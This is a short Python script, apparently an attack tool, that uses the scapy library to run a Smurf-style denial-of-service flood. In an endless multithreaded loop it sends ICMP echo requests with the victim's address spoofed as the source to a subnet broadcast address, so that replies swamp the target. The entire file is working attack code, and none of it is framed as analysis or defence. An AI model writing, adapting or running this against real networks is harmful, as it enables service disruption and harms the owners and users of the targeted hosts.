import threading
from handler import args_handler
from scapy.all import *

def attack(target):
    try:
        broadcast_address = "192.168.1.255"
        while True:
            s_addr = target
            ip = IP(src=s_addr, dst=broadcast_address)
            icmp = ICMP(type=8, code=0)
            pkt = ip / icmp 
            send(pkt)
            
    except Exception as e:
        print(f"An error occurred: {str(e)}")

def main():
    target_ip, num_threads = args_handler() 
    
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip,))
        thread.start()
  
if __name__ == '__main__':
    main()
 